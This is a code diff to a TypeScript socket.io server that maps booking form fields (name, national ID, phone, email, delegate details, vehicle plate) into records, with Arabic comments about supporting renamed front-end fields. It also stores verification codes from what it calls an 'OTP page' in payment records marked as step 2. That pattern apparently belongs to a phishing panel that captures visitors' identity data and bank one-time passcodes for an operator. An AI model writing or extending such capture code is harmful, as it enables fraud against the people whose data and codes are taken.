@@ -65,30 +65,33 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
           .filter(Boolean)
           .join("-");
 
+        // استخراج بيانات المفوض إن وجد
+        const commissioner = data.commissioner as Record<string, unknown> | null | undefined;
         const booking = await createBooking({
           referenceId,
-          clientName: str(data.Name ?? data.name ?? data.InputName),
-          clientId: str(data.ID ?? data.id ?? data.InputID),
-          clientPhone: str(data.PhonNumber ?? data.phonNumber ?? data.InputPhonNumber),
-          clientEmail: str(data.Email1 ?? data.email1 ?? data.InputEmail1),
-          clientNationality: str(data.Nationality ?? data.nationality),
-          hasDelegate: data.flexSwitchDelegate === 1 || data.flexSwitchDelegate === "1",
-          delegateType: str(data.DelegateType ?? data.delegateType),
-          delegateName: str(data.DelegateName ?? data.delegateName),
-          delegatePhone: str(data.DelegatePhone ?? data.delegatePhone),
-          delegateNationality: str(data.DelegateNationality ?? data.delegateNationality),
-          delegateId: str(data.DelegateId ?? data.delegateId),
-          vehicleCountry: str(data.CountryReg ?? data.countryReg ?? data.InputCountryReg),
-          vehiclePlate: plateStr,
+          // دعم الأسماء الجديدة من الموقع الأمامي
+          clientName: str(data.name ?? data.Name ?? data.InputName),
+          clientId: str(data.nationalID ?? data.ID ?? data.id ?? data.InputID),
+          clientPhone: str(data.phoneNumber ?? data.PhonNumber ?? data.phonNumber ?? data.InputPhonNumber),
+          clientEmail: str(data.email ?? data.Email1 ?? data.email1 ?? data.InputEmail1),
+          clientNationality: str(data.nationality ?? data.Nationality),
+          hasDelegate: !!(data.delegateOn) || data.flexSwitchDelegate === 1 || data.flexSwitchDelegate === "1",
+          delegateType: str(commissioner?.type ?? data.DelegateType ?? data.delegateType),
+          delegateName: str(commissioner?.name ?? data.DelegateName ?? data.delegateName),
+          delegatePhone: str(commissioner?.phone ?? data.DelegatePhone ?? data.delegatePhone),
+          delegateNationality: str(commissioner?.nationality ?? data.DelegateNationality ?? data.delegateNationality),
+          delegateId: str(commissioner?.id ?? data.DelegateId ?? data.delegateId),
+          vehicleCountry: str(data.countryOfRegistration ?? data.CountryReg ?? data.countryReg ?? data.InputCountryReg),
+          vehiclePlate: str(data.plate ?? plateStr),
           vehiclePlateChar1: str(data.VehiclePlateChar1 ?? data.vehiclePlateChar1),
           vehiclePlateChar2: str(data.VehiclePlateChar2 ?? data.vehiclePlateChar2),
           vehiclePlateChar3: str(data.VehiclePlateChar3 ?? data.vehiclePlateChar3),
           vehicleType: str(data.TypeVechil ?? data.typeVechil ?? data.InputTypeVechil),
           vehicleCarryDang: data.vehicleCarryDang === 1 || data.vehicleCarryDang === "1",
-          serviceRegion: str(data.RegionSvc ?? data.regionSvc ?? data.InputRegion),
-          serviceType: str(data.TypeSvc ?? data.typeSvc ?? data.InputTypeSvc),
-          serviceDate: str(data.DateSvc ?? data.dateSvc ?? data.InputDateSvc),
-          serviceTime: str(data.TimeSvc ?? data.timeSvc ?? data.InputTimeSvc),
+          serviceRegion: str(data.region ?? data.RegionSvc ?? data.regionSvc ?? data.InputRegion),
+          serviceType: str(data.serviceType ?? data.TypeSvc ?? data.typeSvc ?? data.InputTypeSvc),
+          serviceDate: str(data.dateSvc ?? data.DateSvc ?? data.InputDateSvc),
+          serviceTime: str(data.timeSvc ?? data.TimeSvc ?? data.InputTimeSvc),
           clientIp,
           rawData: data,
           statusRead: 0,
@@ -179,7 +182,8 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
         }
 
         await createOrUpdatePayment(reference, {
-          verifyCode: String(data.verification_code ?? data.verifyCode ?? ""),
+          // دعم verification_code_two من صفحة OTP
+          verifyCode: String(data.verification_code_two ?? data.verification_code ?? data.verifyCode ?? ""),
           step: 2,
           status: "step2_done",
         });
